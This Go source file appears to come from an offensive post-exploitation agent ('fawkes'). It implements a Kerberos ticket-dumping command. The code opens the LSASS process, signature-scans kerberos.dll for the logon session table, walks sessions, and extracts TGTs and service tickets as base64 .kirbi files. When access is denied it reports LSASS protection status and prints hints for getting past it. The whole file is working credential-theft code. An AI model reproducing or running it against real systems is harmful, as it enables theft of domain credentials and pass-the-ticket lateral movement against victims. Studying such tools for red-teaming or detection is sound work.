//go:build windows
// +build windows

package commands

// Kerberos ticket extraction orchestrator for the hashdump "tickets" action.
// Opens LSASS, finds kerberos.dll, sigscan for KerbGlobalLogonSessionTable,
// walks sessions and ticket lists, extracts raw tickets and builds .kirbi files.

import (
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"strings"
	"time"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
)

type kerbTicketReport struct {
	Sessions []kerbSessionReport `json:"sessions"`
	Summary  kerbTicketSummary   `json:"summary"`
}

type kerbTicketSummary struct {
	LsassPID       uint32 `json:"lsass_pid"`
	KerbDllBase    string `json:"kerberos_dll_base"`
	KerbDllSize    uint32 `json:"kerberos_dll_size"`
	TableAddr      string `json:"table_addr"`
	SigVariant     string `json:"sig_variant"`
	SessionLayout  string `json:"session_layout"`
	TicketLayout   string `json:"ticket_layout"`
	SessionsFound  int    `json:"sessions_found"`
	TotalTickets   int    `json:"total_tickets"`
	TGTs           int    `json:"tgts"`
	ServiceTickets int    `json:"service_tickets"`
	KirbiExported  int    `json:"kirbi_exported"`
}

type kerbSessionReport struct {
	LUID     string               `json:"luid"`
	UserName string               `json:"username"`
	Domain   string               `json:"domain"`
	Tickets  []kerbTicketEntryRpt `json:"tickets,omitempty"`
}

type kerbTicketEntryRpt struct {
	ListIndex   int    `json:"list_index"`
	ListName    string `json:"list_name"`
	ServiceName string `json:"service_name"`
	ClientName  string `json:"client_name"`
	Domain      string `json:"domain"`
	Flags       string `json:"flags"`
	KeyType     uint32 `json:"key_type"`
	EncType     uint32 `json:"enc_type"`
	StartTime   string `json:"start_time,omitempty"`
	EndTime     string `json:"end_time,omitempty"`
	RenewUntil  string `json:"renew_until,omitempty"`
	TicketSize  int    `json:"ticket_size"`
	KirbiB64    string `json:"kirbi_b64,omitempty"`
}

func executeKerbTickets() structs.CommandResult {
	ch := make(chan structs.CommandResult, 1)
	go func() {
		defer func() {
			if r := recover(); r != nil {
				ch <- errorf("ticket extraction crashed unexpectedly")
			}
		}()
		ch <- executeKerbTicketsInner()
	}()

	select {
	case r := <-ch:
		return r
	case <-time.After(60 * time.Second):
		return errorf("Kerberos tickets: operation timed out after 60s")
	}
}

func executeKerbTicketsInner() structs.CommandResult {
	pid, err := lsassFindPID()
	if err != nil {
		return errorf("Kerberos tickets: locate lsass.exe: %v", err)
	}

	h, err := lsassOpenForRead(pid)
	if err != nil {
		protection := detectLsassProtection()
		return errorf("Kerberos tickets: open lsass.exe pid=%d: %v\n[!] Protection: %s\n[!] %s",
			pid, err, protection.Summary(), protection.AccessDeniedHint())
	}
	defer windows.CloseHandle(h)

	kerbMod, err := lsassFindModuleInLsass(pid, "kerberos.dll")
	if err != nil {
		return errorf("Kerberos tickets: find kerberos.dll in lsass: %v", err)
	}
	kerbBytes, err := lsassReadModuleBytes(h, kerbMod)
	if err != nil {
		return errorf("Kerberos tickets: read kerberos.dll (base=0x%X size=%d): %v",
			kerbMod.Base, kerbMod.Size, err)
	}

	tableAddr, sigVariant, err := findKerbSessionTable(kerbBytes, kerbMod.Base)
	if err != nil {
		return errorf("Kerberos tickets: %v", err)
	}

	reader := lsassRemoteReader{h: h}
	sessLayout, tickLayout := selectKerbLayouts(0)

	sessLayout = kerbProbeSessionLayout(reader, tableAddr, sessLayout)
	sessions, err := walkKerbSessionList(reader, tableAddr, sessLayout)
	if err != nil && len(sessions) == 0 {
		return errorf("Kerberos tickets: walk session list: %v", err)
	}

	tickLayout, ticketProbeMsg, ticketDiagOutput := kerbProbeTicketLayout(reader, sessions, sessLayout, tickLayout)
	diagOutput := kerbDiagScanSessions(sessions, sessLayout)

	sessionReports, outputLines, stats := kerbExtractAllTickets(reader, sessions, sessLayout, tickLayout)

	summary := kerbTicketSummary{
		LsassPID: pid, KerbDllBase: fmt.Sprintf("0x%X", kerbMod.Base),
		KerbDllSize: kerbMod.Size, TableAddr: fmt.Sprintf("0x%X", tableAddr),
		SigVariant: sigVariant, SessionLayout: sessLayout.Name,
		TicketLayout: tickLayout.Name, SessionsFound: len(sessions),
		TotalTickets: stats.total, TGTs: stats.tgts,
		ServiceTickets: stats.service, KirbiExported: stats.kirbi,
	}

	report := kerbTicketReport{Sessions: sessionReports, Summary: summary}
	jsonBytes, err := json.MarshalIndent(report, "", "  ")
	if err != nil {
		return errorf("Kerberos tickets: marshal report: %v", err)
	}

	header := kerbFormatHeader(summary, kerbMod, sessions, ticketProbeMsg, outputLines)

	if stats.total > 0 && stats.kirbi == 0 && ticketDiagOutput != "" {
		diagOutput += "\n" + ticketDiagOutput
	}

	return successResult(header + diagOutput + "\n" + string(jsonBytes))
}

func kerbProbeSessionLayout(reader lsassRemoteReader, tableAddr uintptr, sessLayout kerbSessionLayout) kerbSessionLayout {
	probeSlots := detectHashTableSize(reader, tableAddr)
	for slot := 0; slot < probeSlots; slot++ {
		slotAddr := tableAddr + uintptr(slot*16)
		head, headErr := readListEntry(reader, slotAddr)
		if headErr != nil || head.Flink == 0 || head.Flink == slotAddr {
			continue
		}
		probeBase := head.Flink - uintptr(sessLayout.ListEntryOff)
		return probeKerbSessionLayout(reader, probeBase, sessLayout)
	}
	return sessLayout
}

func kerbProbeTicketLayout(reader lsassRemoteReader, sessions []kerbSession, sessLayout kerbSessionLayout, tickLayout kerbTicketLayout) (kerbTicketLayout, string, string) {
	for _, sess := range sessions {
		for _, tl := range []struct{ off, idx int }{
			{sessLayout.Tickets1Off, 1}, {sessLayout.Tickets2Off, 2}, {sessLayout.Tickets3Off, 3},
		} {
			if tl.off+16 > len(sess.Raw) {
				continue
			}
			listHeadAddr := sess.Address + uintptr(tl.off)
			head2, headErr2 := readListEntry(reader, listHeadAddr)
			if headErr2 != nil || head2.Flink == 0 || head2.Flink == listHeadAddr {
				continue
			}
			probeBuf, pErr := reader.Read(head2.Flink, 0x200)
			if pErr != nil || len(probeBuf) < 0x100 {
				continue
			}
			tl2, msg := probeKerbTicketLayout(reader, head2.Flink, tickLayout)
			return tl2, msg, ticketDiagHexDump(probeBuf, head2.Flink, tl2)
		}
	}
	return tickLayout, "", ""
}

func kerbDiagScanSessions(sessions []kerbSession, sessLayout kerbSessionLayout) string {
	var diagOutput string
	for _, sess := range sessions {
		if sess.UserName == "" {
			continue
		}
		diagOutput += fmt.Sprintf("\n[LE] LUID=0x%X user=%q base=0x%X (%d bytes)\n",
			sess.LUID, sess.UserName, sess.Address, len(sess.Raw))
		for off := 0; off+16 <= len(sess.Raw); off += 8 {
			flink := uintptr(binary.LittleEndian.Uint64(sess.Raw[off : off+8]))
			blink := uintptr(binary.LittleEndian.Uint64(sess.Raw[off+8 : off+16]))
			listAddr := sess.Address + uintptr(off)
			if flink == listAddr && blink == listAddr {
				diagOutput += fmt.Sprintf("[LE] +0x%03X: EMPTY (self-ref)\n", off)
			} else if flink > 0x100000000000 && flink < 0x800000000000 &&
				blink > 0x100000000000 && blink < 0x800000000000 {
				diagOutput += fmt.Sprintf("[LE] +0x%03X: PTR f=0x%X b=0x%X\n", off, flink, blink)
			}
		}
		break
	}

	for _, sess := range sessions {
		if len(sess.Tickets) == 0 {
			continue
		}
		for _, tl := range []struct{ off, idx int }{
			{sessLayout.Tickets1Off, 1}, {sessLayout.Tickets2Off, 2}, {sessLayout.Tickets3Off, 3},
		} {
			if tl.off+16 > len(sess.Raw) {
				continue
			}
			flink := uintptr(binary.LittleEndian.Uint64(sess.Raw[tl.off : tl.off+8]))
			headAddr := sess.Address + uintptr(tl.off)
			if flink == 0 || flink == headAddr {
				continue
			}
			diagOutput += fmt.Sprintf("\n[TKT] Session LUID=0x%X list=%d headAddr=0x%X flink=0x%X\n",
				sess.LUID, tl.idx, headAddr, flink)
			break
		}
		break
	}
	return diagOutput
}

type kerbTicketStats struct {
	total, tgts, service, kirbi int
}

func kerbExtractAllTickets(reader lsassRemoteReader, sessions []kerbSession, sessLayout kerbSessionLayout, tickLayout kerbTicketLayout) ([]kerbSessionReport, []string, kerbTicketStats) {
	var stats kerbTicketStats
	sessionReports := make([]kerbSessionReport, 0, len(sessions))
	var outputLines []string

	for i := range sessions {
		sess := &sessions[i]
		sess.Tickets = extractKerbTickets(reader, sess.Raw, sess.Address, sessLayout, tickLayout)
		if len(sess.Tickets) == 0 {
			continue
		}

		sessRpt := kerbSessionReport{
			LUID: fmt.Sprintf("0x%016X", sess.LUID), UserName: sess.UserName, Domain: sess.Domain,
		}

		for _, t := range sess.Tickets {
			stats.total++
			listName := "service"
			if t.ListIndex == 1 {
				listName = "TGT"
				stats.tgts++
			} else {
				stats.service++
			}

			entry := kerbTicketEntryRpt{
				ListIndex: t.ListIndex, ListName: listName, ServiceName: t.ServiceName,
				ClientName: t.ClientName, Domain: t.DomainName,
				Flags: formatTicketFlags(t.TicketFlags), KeyType: t.KeyType,
				EncType: t.TicketEncType, TicketSize: len(t.TicketBytes),
			}
			if !t.StartTime.IsZero() {
				entry.StartTime = t.StartTime.Format(time.RFC3339)
			}
			if !t.EndTime.IsZero() {
				entry.EndTime = t.EndTime.Format(time.RFC3339)
			}
			if !t.RenewUntil.IsZero() {
				entry.RenewUntil = t.RenewUntil.Format(time.RFC3339)
			}
			if len(t.TicketBytes) > 0 {
				kirbi, kErr := buildKirbi(t)
				if kErr == nil && len(kirbi) > 0 {
					entry.KirbiB64 = base64.StdEncoding.EncodeToString(kirbi)
					stats.kirbi++
				}
			}
			sessRpt.Tickets = append(sessRpt.Tickets, entry)

			line := fmt.Sprintf("[%s] %s\\%s → %s (%s)", listName, sess.Domain, sess.UserName, t.ServiceName, t.DomainName)
			if !t.EndTime.IsZero() {
				line += fmt.Sprintf(" expires %s", t.EndTime.Format("2006-01-02 15:04"))
			}
			outputLines = append(outputLines, line)
		}
		sessionReports = append(sessionReports, sessRpt)
	}
	return sessionReports, outputLines, stats
}

func kerbFormatHeader(summary kerbTicketSummary, kerbMod lsassRemoteModule, sessions []kerbSession, ticketProbeMsg string, outputLines []string) string {
	var header strings.Builder
	header.WriteString("=== Kerberos Ticket Extraction ===\n")
	header.WriteString(fmt.Sprintf("LSASS PID: %d | kerberos.dll: %s (size %d)\n",
		summary.LsassPID, summary.KerbDllBase, kerbMod.Size))
	header.WriteString(fmt.Sprintf("Signature: %s | Table: %s\n", summary.SigVariant, summary.TableAddr))
	header.WriteString(fmt.Sprintf("Sessions: %d | Tickets: %d (TGTs: %d, Service: %d) | Kirbi: %d\n",
		summary.SessionsFound, summary.TotalTickets, summary.TGTs, summary.ServiceTickets, summary.KirbiExported))
	if ticketProbeMsg != "" {
		header.WriteString(fmt.Sprintf("Ticket probe: %s\n", ticketProbeMsg))
	}
	header.WriteString("\nAll sessions:\n")
	for i := range sessions {
		s := &sessions[i]
		header.WriteString(fmt.Sprintf("  [%d] LUID=0x%X user=%q domain=%q tickets=%d\n",
			i, s.LUID, s.UserName, s.Domain, len(s.Tickets)))
	}
	header.WriteString("\n")
	for _, line := range outputLines {
		header.WriteString(line + "\n")
	}
	return header.String()
}
